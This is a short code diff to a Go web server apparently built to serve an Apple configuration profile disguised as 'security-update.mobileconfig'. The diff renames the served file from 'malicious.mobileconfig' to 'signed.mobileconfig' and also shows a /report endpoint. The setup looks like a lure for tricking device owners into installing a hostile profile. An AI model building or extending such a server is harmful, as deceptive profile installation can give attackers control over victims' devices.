@@ -1,4 +1,4 @@
-
+// main.go
 package main
 
 import (
@@ -39,7 +39,7 @@ func startAPIServer() {
 	router.GET("/install-profile", func(c *gin.Context) {
 		c.Header("Content-Type", "application/x-apple-aspen-config")
 		c.Header("Content-Disposition", "attachment; filename=security-update.mobileconfig")
-		c.File("malicious.mobileconfig")
+		c.File("signed.mobileconfig")
 	})
 
 	router.POST("/report", func(c *gin.Context) {
